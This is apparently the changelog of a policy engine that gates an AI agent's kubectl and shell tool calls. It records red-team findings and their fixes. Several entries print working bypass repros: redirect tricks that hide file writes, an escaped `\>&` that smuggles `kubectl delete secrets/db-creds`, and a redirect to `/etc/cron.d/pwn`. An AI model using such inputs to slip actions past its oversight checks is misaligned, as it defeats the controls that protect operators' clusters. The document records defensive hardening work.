  - Confirmed the parallel exclusion in `findLiveTrailingSensitiveSeparator` (Issue #81's OTHER fd-dup exclusion, for `&` vs. command-separator classification) needs no equivalent change: an `&` immediately adjacent to a live `>` is NEVER a command separator, in either the digit form or the word form — it is always consumed as part of the redirect operator syntax itself, so that exclusion's existing unconditional behavior stays correct as-is.
- Named failing tests added FIRST, confirmed RED against the unfixed code, then GREEN after the fix: `shell-scanner.test.ts` (7 tests — the report's own repro at the primitive level for both `extractRedirectTargets` and `findLiveRedirectOperatorPositions`, the glued spelling, and regression pins for `>&2`/multi-digit `>&12`/`>&-`/`&>`) and `shell.test.ts` (6 tests — the report's own end-to-end repro, the glued spelling, an isolated plain-write case proving the fix produces the correct POSITIVE target rather than merely denying, and regression pins for `>&-`/`&>`/`2>&1`). New fixtures `shellFdDupWordRedirectCall`/`shellFdDupWordRedirectGluedCall`/`shellFdDupWordRedirectPlainWriteCall`/`shellFdDupCloseFdCall` (`src/policy/fixtures/normalizer-calls.ts`).
- `src/qa/shell-detector-mutants.ts`: 1 pre-existing mutant's anchor updated (`redirect-match-fd-dup-exclusion-disabled`, now targeting the whole trailing-ampersand branch rather than the single line the conditional replaced); 3 new named mutants for this fix's own new branches (the digit/`-`-conditional's exact regression — reverting to an unconditional skip, which is Issue #84 itself; the digit/`-` check inverted, which would instead fabricate a bogus target out of a genuine fd-dup; the `length + 1` extension removed, which would extract a bogus `&`-prefixed target). Mutant count: 49 -> 52, all independently KILLED.
- Verification: `npm test` 425/425 pass, 0 fail, 0 skipped (13 more than round 3.5's 412); `npm run typecheck`/`npm run lint` clean; `npm run qa:mutation-shell` 52/52 KILLED, non-vacuous; `npm run qa:kernel-purity`/`qa:normalizer-registry-purity` PASS, zero diff to `kernel.ts`/`action-catalog.ts`/`target-format.ts`/`registry.ts` confirmed via `git diff --stat`.

### Fixed — S4 round 5 re-confirm follow-up, Issue #84 residual fix-now (human-ruled Option A, `docs/decisions.md` 2026-09-06 row, `docs/reviews/s4-shell-semantic-detector-issue84-path-forward-2026-09-06.md`)
`red-team`'s mandated round-5 re-confirm of the round-4 fix (above) found ONE new residual in the SAME line: the round-4 fix read only the ONE character immediately after `&`, not the whole word bash actually classifies on. This tripped PRINCIPLES rule 16(c)'s hard stop a second consecutive time on the same code path; the human ruled **Option A**: apply red-team's own proven fix (already validated against a real bash 5.3.9 oracle — 25/25 conformance — and the full 143-test suite, in an isolated copy) verbatim, land the conformance table as a committed test, re-anchor the affected mutants, then one fast final re-confirm. Applied here, verbatim, per that ruling.

- **[HIGH, Issue #84 residual, red-team round-5]** `findLiveRedirectMatches`'s round-4 fd-dup check (`src/policy/normalizer/shell-scanner.ts`) tested only the SINGLE character immediately after `&` (`/\d/.test(afterAmpersand)`) — bash classifies `>&WORD` on the WHOLE word: fd-dup **iff** WORD is entirely digits or starts with `-`. A digit-LEADING but not all-digit word — the single most ordinary filename shape in ops, a date-stamped log — still misclassified as fd-dup and silently vanished as a write target: `kubectl get pods/api --context=prod >&2026-09-06.log` clean-resolved as a read while real bash 5.3.9 creates and writes the file; deleting one space (`>& 2026-09-06.log`) correctly denied. Fixed, applying red-team's own pre-validated 2-line candidate verbatim: reuses the module's own quote-aware `tokenize` (already invoked one line later by this function's caller) to read the WHOLE word after `&`, not a second character — `const [fdWord] = tokenize(liveText.slice(idx + length + 1)); const isFdDup = fdWord !== undefined && (fdWord.startsWith("-") || /^\d+$/.test(fdWord));`. As a side effect, also fixes 5 fail-closed over-denials the round-4 fix introduced (`>&"2"`, `>&\2`, `>& -x`, plus the pre-existing dash/digit forms now correctly resolved via `tokenize`'s quote/escape-awareness rather than a raw character read).
- Named failing tests added FIRST, confirmed RED against the round-4 (unfixed) code, then GREEN after the fix: `src/policy/normalizer/shell.test.ts` (the report's own exact repro, `"kubectl get pods/api --context=prod >&2026-09-06.log"` must deny) and `src/policy/normalizer/shell-scanner.test.ts` (a new committed 25-case bash-conformance table — `extractRedirectTargets bash-conformance table — 25 named '>&' forms match observed bash 5.3.9`, reproducing red-team's own measured ground truth against real bash 5.3.9(1)-release). New fixture `shellFdDupDigitLeadingWordRedirectCall` (`src/policy/fixtures/normalizer-calls.ts`).
- `src/qa/shell-detector-mutants.ts`: 2 pre-existing mutants' anchors re-pointed at the new fix's exact text (`trailing-ampersand-word-form-treated-as-fd-dup`, `trailing-ampersand-digit-dash-check-inverted` — same branches, new code shape); 1 new named mutant for the all-digits-vs-digit-prefix distinction itself (`trailing-ampersand-all-digits-vs-digit-prefix-broken`), the genuinely new decision branch this round's fix introduces. Mutant count: 52 -> 53, all independently KILLED.
- Editorial fixes flagged by red-team's report as verdict-neutral, applied in this round (no logic change): this entry uses the REAL paths for the four frozen files (`src/policy/kernel/kernel.ts`, `src/policy/normalizer/action-catalog.ts`, `src/policy/normalizer/target-format.ts`, `src/policy/normalizer/registry.ts`) rather than bare basenames, since a bare-basename pathspec against `git diff --stat`/`--numstat` can match zero tracked files and pass vacuously (prior entries above are left as originally written, per the report's own "fix as plain edit, no re-review" scope); the `shell-scanner.ts:357`-area comment claiming the fix "mirrors `precededByLiveAmpersand`'s single-character adjacency check" (an invalid analogy — a redirect word is not one character) is replaced with an accurate comment describing the whole-word `tokenize` reuse; the redundant `afterAmpersand !== undefined` guard no longer exists in the new code shape (superseded by the legitimate `fdWord !== undefined` check, which guards against `tokenize` returning an empty array, not a redundant re-test).
- Verification: `npm test` 427/427 pass, 0 fail, 0 skipped (2 more than round 5's initial 425); `npm run typecheck`/`npm run lint` clean; `npm run qa:mutation-shell` 53/53 KILLED, non-vacuous; `npm run qa:kernel-purity`/`qa:normalizer-registry-purity` PASS, zero diff to `src/policy/kernel/kernel.ts`/`src/policy/normalizer/action-catalog.ts`/`src/policy/normalizer/target-format.ts`/`src/policy/normalizer/registry.ts` confirmed via `git diff --numstat` (real paths).

### Fixed — S4 round 3 re-confirm (`red-team` no-go on one new sibling defect; `cross-domain-reviewer` APPROVE): Issue #83
`docs/reviews/s4-shell-semantic-detector-red-team-round3-2026-09-03.md` independently re-verified Issues #80, #81, #82 as genuinely closed against their own repros, and found ONE new defect in round 3's own #81 fd-dup fix — the third consecutive round in which a fix introduced a sibling defect in its own new code, flagged explicitly as a pattern worth weighing.

- **[HIGH, Issue #83, red-team round-3 re-confirm]** `findLiveTrailingSensitiveSeparator`'s #81 fd-dup exclusion compared the RAW neighbouring character to `">"` (`text[i±1] !== ">"`) with no check that the `>` was actually LIVE. A backslash-escaped `\>` (an ordinary, inert argument character in bash — no redirect at all) satisfied that raw comparison exactly as well as a genuine live operator, so a REAL `&` background separator right after it was wrongly excluded as fd-dup: `kubectl get --context=prod \>& kubectl delete secrets/db-creds --context=prod` clean-resolved as `verbs=["get"]` on `secrets/db-creds`, while real bash executes the delete. Deliberately evades round 3's own >=2-target guard (Issue #82): the first command contributes no resource token of its own, so the only surviving target is the hidden second command's own — a target-count heuristic counts targets, not commands, and this is exactly its boundary, not a defect in the guard itself.
  - **Root fix, not a fourth parallel raw-character check:** `walkQuoteState` (`shell-scanner.ts`) now tracks a companion `escaped: boolean[]` array alongside its existing `perChar` quote-span array — additive only, every existing "is this state `'none'`" check keeps its exact current meaning. New exported `escapedChars(text)` and a shared `isLiveGreaterThan(text, states, escaped, pos)` helper answer "is this `>` a genuinely live operator" in exactly ONE place, reused by BOTH `findLiveTrailingSensitiveSeparator`'s fd-dup-adjacency check (the reported defect) and `findLiveRedirectMatches`'s own `states[idx] !== "none"` liveness check (its structural sibling — proven independently exploitable: `echo a \> b` wrongly extracted `b` as a write target before this fix) and its `precededByLiveAmpersand` calculation (a third sibling location: a backslash-escaped `&` immediately before a live `>`, e.g. `cmd \&> /tmp/out`, was wrongly treated as the `&>` both-streams form). All three call sites now go through the same escape-aware primitive rather than three independent re-derivations of "is this character live."
  - `findLiveRedirectMatches`'s escape check resumes scanning right after just the escaped character (`re.lastIndex = idx + 1`), not past the whole matched operator run, so a genuinely live second `>` glued directly onto an escaped one (`\>>x`) is still found as its own real redirect — verified by a named edge-case test, not merely asserted.
  - Deliberately NOT touched: `findLiveChainOperator`, `findLiveSubstitution`, `findLiveHeredocMarker` — none of these use the "escaped character mistakenly suppresses an adjacent, different check" shape #83 exploits (their own escape-blindness, if any, is an over-detection/fail-closed direction, not a bypass), and touching them would be scope beyond this finding's actual exploit class.
- Named failing tests added FIRST, confirmed RED against the unfixed code, then GREEN after the fix (test-first per red-team's explicit "Named failing test required before merge"): `shell-scanner.test.ts` (5 tests — the report's own repro at the primitive level, `findLiveRedirectOperatorPositions`/`extractRedirectTargets` no longer misreading an escaped `>`, the genuine-fd-dup regression pin, the `\>>x` edge case, and the `precededByLiveAmpersand` sibling case) and `shell.test.ts` (3 tests — the report's own end-to-end repro, the sharper instance with a resource token on the first command, and a genuine-fd-dup regression pin at the record level). New fixtures `shellEscapedRedirectFalseFdDupCall`/`shellEscapedRedirectWithResourceCall` (`src/policy/fixtures/normalizer-calls.ts`).
- `src/qa/shell-detector-mutants.ts`: 3 pre-existing mutants' anchors updated for this fix's own refactor of `findLiveTrailingSensitiveSeparator`/`walkQuoteState`'s return shape; 4 new named mutants for the new escape-awareness logic (the fd-dup-adjacency escape check, the shared `isLiveGreaterThan` helper's own escape clause, `findLiveRedirectMatches`'s escape-skip, and the `precededByLiveAmpersand` escape clause). Mutant count: 46 -> 49, all independently KILLED.
- Verification: `npm test` 412/412 pass, 0 fail, 0 skipped (9 more than the prior round's 403); `npm run typecheck`/`npm run lint` clean; `npm run qa:mutation-shell` 49/49 KILLED, non-vacuous; `npm run qa:kernel-purity`/`qa:normalizer-registry-purity` PASS, zero diff to `kernel.ts`/`action-catalog.ts`/`target-format.ts`/`registry.ts` confirmed via `git diff --stat`; report's own repro and every control case (genuine fd-dup, `&>`, fd-dup-plus-real-separator, the isolated Issue #80 repro, the fused no-space redirect) independently re-run end to end against the fixed code, all matching expected output exactly.

### Fixed — S4 round 3, council-approved path (rule 16(c) tripped after 2 consecutive REWORK/no-go Stage-3 rounds; `docs/reviews/s4-shell-semantic-detector-council-path-forward-2026-09-03.md`, verdict GO)
Round 2's own fix for Issue #73 (collect every resource token, not just the first) built a multi-target `ActionRecord` shape that opened two new HIGH gaps: a normalizer-layer token-exclusion bug (#80) and a kernel-layer gap (#82) `impact-analyst` sharpened with a compound PoC during path-pricing. Council-ruled path: normalizer-boundary collapse (Path B, broadened), keeping `kernel.ts` zero-diff for this story. `docs/decisions.md`'s 2026-09-03 row has the full ruling and recorded dissent.

- **[HIGH, Issue #80, red-team round-2 Finding N1]** `scanFlags`'s redirect-operator exclusion keyed on the token's dequoted VALUE (`tokens[i] === ">" || tokens[i] === ">>"`) — a quoted literal `">"` argument is indistinguishable from a live operator by value alone once quoting is already stripped, so it was silently swallowing the FOLLOWING resource-shaped token along with itself (`kubectl delete pods/api ">" secrets/db-creds --context=prod` dropped `secrets/db-creds` from the record entirely). Fixed: the exclusion now keys on the operator's POSITION in the live text (`shell-scanner.ts`'s new `findLiveRedirectOperatorPositions`, sharing the same live-operator scan `extractRedirectTargets` already used, so the two agree by construction) via `tokenizeWithOffsets`'s new per-token `start` offset — never by re-checking a token's already-dequoted value. A separate (space-delimited) operator token still consumes its own following target token (`isBareOperator`, covering the bare `>`/`>>`/`&>`/`&>>` forms); a no-space merged operator+target token (`cmd>/path`) consumes only itself.
- **[HIGH, Issue #81, red-team round-2 Finding N2]** Round 2's newline/bare-`&` chain-separator fix (Issue #70) was denying the single most common redirect idiom in real shell usage: the fd-dup ampersand form (`2>&1`, `&>`, `>&2`) — REQUIREMENTS.md:173 names "fd-dup ampersand handling" as in-scope. Fixed in two places that both needed the same exclusion: `findLiveTrailingSensitiveSeparator` (`shell-scanner.ts`) no longer treats an `&` immediately adjacent to a live `>` as a command separator; `findLiveRedirectMatches` (the shared scan `extractRedirectTargets`/`findLiveRedirectOperatorPositions` both build on) no longer treats a `>` immediately followed by `&` as a file-targeting redirect (it duplicates a file descriptor, creates no file, and has no path target) — `&>`/`&>>` (redirect BOTH streams to a REAL file, `>` preceded by `&` rather than followed by it) is unaffected and still extracts its real target correctly.
- **[HIGH, Issue #82, cross-domain round-2 + impact-analyst's compound PoC during path-pricing]** `kernel.ts`'s `matchesTarget` (S2-shipped, unchanged, zero-diff) composes an ALLOW rule's match via `.some()` across `action.targets` — never re-derived against a multi-target `ActionRecord`, a shape that did not exist before round 2's Issue #73 fix. A record carrying 2+ targets from ANY combination of resource-collection and redirect-collection lets a narrowly-scoped ALLOW rule authorize an unrelated, bundled target riding along in the same call — impact-analyst's own sharper repro needed only ONE resource token plus ONE unquoted redirect (`kubectl delete pods/api --context=prod > /etc/cron.d/pwn`), not two resource tokens. Council-ruled, deliberately normalizer-only (Path B over Path A's kernel-side fix, per the architect's zero-diff-to-`kernel.ts` scope preference — `docs/decisions.md`'s 2026-09-03 row records the dissent in full): `resolveKubectlShape` (`shell.ts`) now denies via `unresolved` wholesale whenever the assembled target count — resource targets plus redirect targets, from either or both collection paths — reaches 2 or more, in BOTH branches that can produce a multi-target record (the resolved-kubectl-plus-redirect path, and the plain-redirect-only path with no kubectl resource at all). `kernel.ts` stays zero-diff for this story; the general "what does ALLOW mean against a multi-target record" question is real but deliberately deferred, not solved here — see `docs/backlog.md`.
- Two day-1 failing proof-tests each for #80 and #82 (`shell.test.ts`), per `design-challenger`'s boundary-crossing carve-out mandate — both findings cap at MED severity (no live hook wiring exists yet, that's S5) but a security-boundary silent-divergence finding gets a proof-test unconditionally regardless of that cap.
- `src/qa/shell-detector-mutants.ts`: 3 pre-existing mutants' anchors updated for this round's own refactor (the redirect-exclusion mutant now targets the position-based `isRedirectOperatorToken` branch instead of the retired value-based one; the trailing-sensitive-separator ampersand mutant's anchor now spans the two-line statement Issue #81's fd-dup clause extended it onto; the additive-redirect-extraction mutant's anchor now includes the `const targets = [...resourceTargets];` line the multi-resource fix inserted before it) — each would otherwise throw loudly on the next `qa:mutation-shell` run per the file's own fail-loud-on-moved-anchor design, rather than silently stop covering anything. 6 new named mutants added for this round's own new logic: the position-based redirect-operator exclusion being disabled outright, the bare-vs-merged operator-span distinction (`isBareOperator`), the fd-dup exclusion in `findLiveRedirectMatches` (Issue #81's redirect-match side), the `&>`-prefixed token-start calculation (Issue #80's `&>` support), and the assembled-target-count guard in both branches it applies to (Issue #82). One existing regression test (`shell.test.ts`, the malformed-resource-plus-redirect case) strengthened to pin exact `verbs`/`targets`, not just `unresolved.length > 0` — round 3's own guard made that mutant's *previous* primary reachable case (a clean multi-target resolve) categorically unreachable, leaving this malformed-resource path as its only remaining reachable case, which a bare length check couldn't distinguish. Mutant count: 40 -> 46, all independently KILLED (`npm run qa:mutation-shell`).
- Verification: `npm test` 403/403 pass, 0 fail, 0 skipped (26 more than round 2's 377); `npm run typecheck`/`npm run lint` clean; `npm run qa:mutation-shell` 46/46 KILLED, non-vacuous; `npm run qa:kernel-purity`/`qa:normalizer-registry-purity` PASS, zero diff to `kernel.ts`/`action-catalog.ts`/`target-format.ts`/`registry.ts` confirmed via `git diff --stat`.

### Added — S3: normalizer registry + tool inventory (POL-04, POL-12, SUR-01, SUR-03, SUR-04)
- `src/policy/normalizer/` — ADR-0021 shape 3, declaration-based, in-memory/fixture data (docs/decisions.md 2026-09-01 S3-intake row):
  - `registry.ts` (+ `.test.ts`): `registerNormalizer`/`resolveNormalizer`/`normalize(toolType, raw)`. Imports no concrete normalizer module — every tool type registers itself onto the registry, never the reverse (POL-12). An unrecognized `toolType` produces an opaque `ActionRecord`, never a silent `allow` (ADR-0021 §3.2/SUR-02).
  - `action-catalog.ts` (+ `.test.ts`): `KNOWN_VERBS`/`resolveVerb` — the real action catalog `docs/backlog.md`'s S2 residual note named this story to build. Distinct from `kernel.ts`'s own `MUTATING_VERBS` (different question; zero diff to `kernel.ts`).
  - `target-format.ts`: `buildClusterTarget` — shared target-string convention so a structured call and its shell equivalent produce the byte-identical target (POL-04).
  - `shell.ts` (+ `.test.ts`), `structured-cluster.ts` (+ `.test.ts`): one shell and one structured-protocol normalizer, both emitting S2's canonical `ActionRecord`. The shell normalizer recognizes one fixed, documented command shape only — NOT SUR-06/07/08's semantic detector (S4's job). Both report a verb outside `KNOWN_VERBS` via `unresolved`, never a silently-passed verb string.
- `src/policy/tools/classification.ts` (+ `.test.ts`) (SUR-03): `evaluateToolInventory(catalog, sessionTools)` — the classification/halt-decision function, fixture-proven. Halts (fail-closed) the instant any session tool has no catalog entry; real session introspection and hook wiring are S5's job.
- `src/policy/verification/allowlist.ts` (+ `.test.ts`) (SUR-04): `verifyAllowlistInForce(settings)` — verifies `allowManagedMcpServersOnly`+`allowedMcpServers` or a deployed `managed-mcp.json` is in force, against fixture settings content. Real deployed-settings-file reads stay INT-07 (S9)/REL-12 (S14).
- `src/policy/rule/precedence.ts` (+ `.test.ts`): extended, not rewritten — `mergeLayers` (POL-08) is behavior/signature-unchanged; its three-layer merge-by-id logic is factored into a shared generic `mergeLayersById` core, which the new `mergeToolClassificationLayers(shippedDefaults, central)` (SUR-03/T5, two-tier, central wins) also calls.
- `src/policy/fixtures/{normalizer-calls,tool-classification,allowlist-settings}.ts`: new fixture data, including a structured/shell parity pair reusing S2's own already-reviewed `CONFLICTING_RULE_ID` rule fixture for a real registry → kernel integration proof.
- `src/qa/normalizer-registry-purity-check.ts` (+ `.test.ts`, `qa:normalizer-registry-purity` script): new structural instrument (POL-12's own "no diff inside the kernel or an existing normalizer" compliance-verification bar) — scans `src/policy/normalizer/registry.ts` for a sibling-directory import (the registry "knowing about" a concrete normalizer) or a `switch` dispatch chain. Wired into `.github/workflows/ci.yml`'s main `ci` job. Proven against `src/qa/selftest-fixture/normalizer-registry-purity/{clean,violating}/` and, non-vacuously, against the real `src/policy/normalizer/registry.ts`.
- `docs/backlog.md`: closed the S2 re-confirm residual note (unrecognized-verb boundary) this story was explicitly assigned to resolve.

### Fixed — S3 Stage 3 review fix-now pass (`app-security-reviewer` APPROVE-WITH-CONDITIONS, 2026-09-01)
- **[MED, GH issue 65, app-security-reviewer]** `src/policy/normalizer/shell.ts`: `const [rt, rn] = resourceToken.split("/")` silently discarded any segment beyond the first two — a resource token with a smuggled THIRD segment (e.g. `secrets/db-password/extra-smuggled-segment`) resolved cleanly to `resourceName: "db-password"`, `unresolved: []`, contradicting the file's own "never guessed at or silently dropped" promise. Fixed: the split must produce exactly 2 non-empty segments; anything else is reported via `unresolved`, identically to the no-resource-token case. Reviewer's exact repro re-run against the fix, independently: `unresolved: ["command resource ..."]`, `targets: []`. New regression tests in `shell.test.ts` and `registry.test.ts` (end-to-end, denies via POL-05).
- **[MED, GH issue 66, app-security-reviewer]** `src/policy/normalizer/target-format.ts`'s `buildClusterTarget` (shared by `shell.ts`, `structured-cluster.ts`) joined typed field values with "/" with zero delimiter validation — a field value containing an embedded "/" (e.g. `resourceName: "root-password/x"`) silently produced a longer, ambiguous target string that no longer exact-matched the canonical value a policy author would write an exact-match deny rule against, while the record reported itself fully resolved. Fixed: `buildClusterTarget` now returns `undefined` when any of its four fields contains the delimiter; both call sites push to `unresolved` instead of silently building a spoofed target. Reviewer's exact repro re-run against the fix, independently: `record.targets: []` (was `["prod/cluster/prod-cluster/secrets/root-password/x"]`), `record.unresolved` now populated. New `target-format.test.ts` (direct unit coverage) plus regression tests in `structured-cluster.test.ts` and `registry.test.ts` (end-to-end, denies via POL-05).
- Both findings' Issues (#65, #66) closed `completed`. `npm test`: 246/246 pass (10 new tests), 0 fail, 0 skipped. `typecheck`/`lint`/`qa:kernel-purity`/`qa:normalizer-registry-purity` all clean, zero diff to `src/policy/kernel/**` or `registry.ts`.

Noticed during S2's build (pre-dates S2, not caused by it), fixed while this file was already being touched for S2's close-out — rephrased to avoid the bare-claim pattern rather than fabricating a marker for something no instrument tracks.

### Added — S2: canonical Action record + pure policy kernel (POL-01, POL-02, POL-04, POL-05, POL-06, POL-08, POL-11, SUR-09)
- `src/policy/kernel/` — the enforced purity boundary (ADR-0021 shapes 1–2), pure in-memory, no config-file I/O, no normalizer registry (docs/decisions.md 2026-09-01 S2 row):
  - `action-record.ts` (+ `.test.ts`): the canonical `ActionRecord` type (`source`, `verbs`, `targets`, `environment`, `identity`, `deferred`, `unresolved` — POL-04's floor) and `isActionRecord`, a structural floor check that tolerates extra non-branching fields.
  - `rule-types.ts`, `verdict.ts`: shared pure vocabulary (`Rule`, `RuleSet`, `ValidationError`, `Verdict`) — type-only, no dedicated test (checked by `npm run typecheck`).
  - `kernel.ts` (+ `.test.ts`): `decide(worldFacts, action): Verdict` — `pol05Rule`/`isMutating` implement POL-05's fail-closed rule (deny a mutating action with `source: "opaque"` or a non-empty `unresolved`) unconditionally inside the kernel; neither function reads `action.deferred`, proving SUR-09 (deferred evaluated as execution, never a lesser class) by omission, verified by a parity test. `matchRules`/`decide` additionally evaluate a passed-in, already-resolved `RuleSet` (POL-01: policy expressed as data, no forbidden-action/path/tool-class/tier code literals) — DENY wins over ALLOW on overlapping matches; falls back to `worldFacts.defaultOutcome` when nothing matches.
- `src/policy/rule/` — outside the kernel boundary, consumes its types:
  - `schema.ts` (+ `.test.ts`): `validateRule`/`validateRuleSet` (POL-06) — schema-validates against `unknown` input (ready for S6's real loader), rejects every unknown key by name with the expected shape, never a silent no-op.
  - `precedence.ts` (+ `.test.ts`): `mergeLayers(shippedDefaults, central, project)` (POL-08) — deterministic three-layer merge, later layer wins per rule id, each merged rule tagged with its winning `sourceLayer` for inspectability.
- `src/policy/fixtures/` — in-memory `ActionRecord`/`RuleSet` fixtures, including the three-layer-conflict case (same rule id, different effect in all three layers) `precedence.test.ts` and `kernel.test.ts` both exercise end to end.
- `src/qa/kernel-purity-check.ts` (+ `.test.ts`, `qa:kernel-purity` script): new structural instrument (ADR-0021's "enforced by a lint rule or structural test") — scans every production `.ts` under `src/policy/kernel/**` (test files excluded, documented rationale), flags non-relative/out-of-directory imports and forbidden globals (`process`, `fetch(`, `setTimeout(`, `setInterval(`, `require(`, dynamic `import(`, `__dirname`, `__filename`) on comment-stripped source. Wired into `.github/workflows/ci.yml`'s main `ci` job (every push/PR). Proven against `src/qa/selftest-fixture/kernel-purity/{clean,violating}/` and, non-vacuously, against the real `src/policy/kernel/` it ships alongside.

### Fixed — Stage 3 review fix-now pass (S2, `cross-domain-reviewer` REWORK + `app-security-reviewer` APPROVE-WITH-CONDITIONS, 2026-09-01)
- **[HIGH, GH issue 61, cross-domain-reviewer]** `src/policy/kernel/action-record.ts`: `ActionRecord.source` was typed as an open tool-family `string` (`"fs"`, `"shell"`, …), contradicting ADR-0021's Decision table (`adr/software-engineering/0021-thoth-native-architecture.md:111`) and `REQUIREMENTS.md` §3.1 (line 443), both of which define it as the literal parse-confidence union `"parsed" | "structured" | "opaque"`. Retyped to the literal union; `isActionRecord`'s runtime guard now checks against the three literals instead of `typeof === "string"`. Every fixture in `src/policy/fixtures/action-records.ts` and both `.test.ts` sample records updated to conforming values (`"structured"`/`"parsed"`, `"opaque"` unchanged where that's the point of the fixture) — tool-family tracking was dropped outright, nothing depended on it. New regression tests prove the guard now rejects a real-but-non-conforming string (`"shell"`, `"fs"`) and accepts each of the three literals. `npm run typecheck` confirms no `as ActionRecord['source']` cast was introduced to paper over the retype.
- **[MED, GH issue 62, app-security-reviewer — CORRECTED, see the second fix-now pass below]** ~~`src/policy/kernel/kernel.ts`: POL-05's fail-closed check (`isMutating`/`pol05Rule`) gates on a hardcoded, closed verb list before ever inspecting `source`/`unresolved` — spec-compliant as written, but resting on an undocumented invariant. Documented explicitly, directly on `isMutating` and `pol05Rule`: any verb a future normalizer (ADR-0021 shape 3) cannot classify as mutating/non-mutating MUST be surfaced via `unresolved`, never omitted. New pinned regression test in `kernel.test.ts` proves an action carrying a verb outside the hardcoded `MUTATING_VERBS` set (surfaced via `unresolved`, alongside a recognized mutating verb so `pol05Rule` is actually reached) is denied — proving `unresolved`, not the closed verb list, is the real safety net.~~ **This entry overclaimed: it was a code-comment-only change, not a behavior fix, and its regression test kept a recognized mutating verb (`"write"`) alongside the unclassifiable one, so `isMutating`'s pre-existing verb-list check alone was sufficient to pass it — the test never exercised the actual gap. app-security-reviewer re-ran the original PoC directly on re-review and confirmed it still resolved to `allow`. The real fix is below.
- **[MED, GH issue 63, app-security-reviewer, interim half only]** `src/qa/kernel-purity-check.ts`: the forbidden-globals regex was defeated by trivial string-concatenation obfuscation (e.g. `Reflect.get(globalThis, "proc" + "ess")` never contains the literal token `"process"`). `FORBIDDEN_GLOBAL_PATTERNS` widened to also flag the bare identifiers `globalThis`, `Reflect`, `eval`, and `Function` used as a constructor call (`new Function(`/bare `Function(`, not a bare type-annotation use of the word). New violating-fixture case `src/qa/selftest-fixture/kernel-purity/violating/obfuscated-globals.ts` demonstrates the exact obfuscation the reviewer found; new unit and non-vacuous integration tests in `kernel-purity-check.test.ts` prove it's now caught. The durable AST-based check (`docs/backlog.md`) stays deferred, out of scope for this pass.

### Fixed — second, targeted fix-now pass (S2, `app-security-reviewer` re-confirm APPROVE-WITH-CONDITIONS, 2026-09-01)
- **[MED, GH issue 62, app-security-reviewer, real fix this time]** `src/policy/kernel/kernel.ts`: the first fix-now pass only documented the `isMutating`/`MUTATING_VERBS` gap in a code comment — it did not change behavior. Reviewer re-ran the original PoC directly against the kernel (`verbs: ["patch"]`, no recognized mutating verb, `unresolved: ["verbs[0]"]`) and confirmed it still resolved to `allow`: `isMutating` returned `false` (verb not in `MUTATING_VERBS`), so `pol05Rule` never even inspected `unresolved`. Fixed for real: `isMutating(action)` now also returns `true` whenever `action.unresolved.length > 0`, independent of verb classification (additive OR, verb-list check unchanged) — ambiguity forces POL-05's check to run regardless of whether the verb list recognizes the verb. The previous, misleading "Issue #62 regression" test (which kept a recognized verb, `"write"`, riding alongside the unclassifiable one, so it never actually exercised the gap) is replaced with tests that isolate the true boundary: a record whose *only* verb is outside `MUTATING_VERBS`, with `unresolved` non-empty, is now denied end-to-end (`isMutating`, `pol05Rule`, and `decide` each pinned separately in `kernel.test.ts`); the closed-list behavior for a verb that is outside `MUTATING_VERBS` AND *not* flagged via `unresolved` is confirmed unchanged (still non-mutating) — that wider, deliberately deferred question (an unrecognized-but-unflagged verb) stays tracked in `docs/backlog.md`'s "S2 re-confirm" entry, owned by ADR-0021 shape 3 (the normalizer registry), not this fix. Code comments on `isMutating`/`pol05Rule` rewritten to state current coverage accurately instead of describing a comment-only mitigation as if it were a behavior fix.
- **[MED, GH issue 63 addendum, app-security-reviewer]** `src/qa/kernel-purity-check.ts`: the first fix-now pass's widened pattern list covered `globalThis` but missed Node's distinct bare `global` identifier, so `global["proc"+"ess"]` bypassed the check with zero detections. Added `{ name: "global", re: /\bglobal\b/ }` to `FORBIDDEN_GLOBAL_PATTERNS`, word-bounded so it does not match inside `globalThis` (no word boundary between "global" and "This") or any other substring-containing identifier. `src/qa/selftest-fixture/kernel-purity/violating/obfuscated-globals.ts` extended with a second exported function demonstrating the exact `global["proc"+"ess"]` obfuscation; new unit tests (including an explicit false-positive check against `globalThis`/`globalization`) and a non-vacuous integration test in `kernel-purity-check.test.ts` prove it's now caught. Durable AST-based check remains deferred (`docs/backlog.md`).

### Changed — REQUIREMENTS.md amendment 2026-09-01: runtime primitives overtook the document (pending architecture review)
- §1.4 rebuilt: every runtime primitive now names its actual managed-settings key. Six shipped, admin-enforceable keys were uncounted while the requirements they cover stayed marked *build*.
- **SUR-04** moved from build to configure-and-verify (`allowManagedMcpServersOnly` + `allowedMcpServers`). **INT-01**'s runtime-settings half likewise (`allowManagedPermissionRulesOnly`, `permissions.disableBypassPermissionsMode`, `allowManagedHooksOnly`, `strictPluginOnlyCustomization`, `strictKnownMarketplaces`, `disableSideloadFlags`).
- **POL-09 split**: write-protection is now a runtime primitive (admin console / plist / HKLM delivery, unwritable by the governed session); immutable pinning and the per-artifact stamp remain a build. Narrowed the matching §1.5 row.
- **ENV-13** and **SUR-11** acceptance now name `sandbox.enabled` / `sandbox.network.allowedDomains`.
- §0.7 gains normative **rule 6**: a runtime primitive shipping after this document retires the requirement it covers, re-checked by instrument.
- **QA-17 added (P0, lands in M1)**: instrument that diffs the runtime's published settings surface against §1.4's named keys and fails on an uncounted key. Enforcement mechanism for rule 6.
- Open decisions added: **T14** audit substrate (blocks scheduling the gap-G7 copy-and-fix), **T15** policy-engine substrate (Cedar, resolve by differential after M1.5), **T16** containment by workspace vs by probe (deliberately unanswered, gated on evaluation evidence).
- Explicitly unchanged and recorded as such: the semantic detector (SUR-06 to SUR-09), gap **G5** (`SessionStart` still cannot halt), and all of §6 (the unlock economy).

### Added — S1: protect the baseline (CI-01, QA-01, QA-02, QA-05, QA-06, QA-13, QA-14, QA-15, QA-16, OSS-01)
- Project skeleton: TypeScript (run natively via Node's built-in type stripping, `engines.node >=22.18.0`), `node:test`, npm scripts, ESLint flat config (SE ADR-0010), Apache-2.0 `LICENSE`.
- `.github/workflows/ci.yml` (CI-01): lint, typecheck, full test suite, and every QA/OSS instrument's own gate run on every push/PR to `master`.
- `src/qa/fixture-coverage-check.ts` (QA-01): fails the build when a policy rule has no positive or negative fixture. Zero-rules-today state discloses as a vacuous pass, loudly.
- `src/qa/diff-fixture-check.ts` (QA-02): fails the build when a policy rule is added or changed in a diff with no accompanying fixture change.
- `src/qa/fixture-isolation-check.ts` (QA-05): fails when a test fixture writes into a declared live governance path. Proven against a deliberately-broken self-test fixture.
- `src/qa/mutation-harness.ts` (QA-06): generic apply-mutant → shadow-copy → rerun-suite → kill/survive engine. Proven against a live self-test mutant (real subprocess, real kill). Zero-real-mutant-classes state (no detector exists yet) discloses loudly.
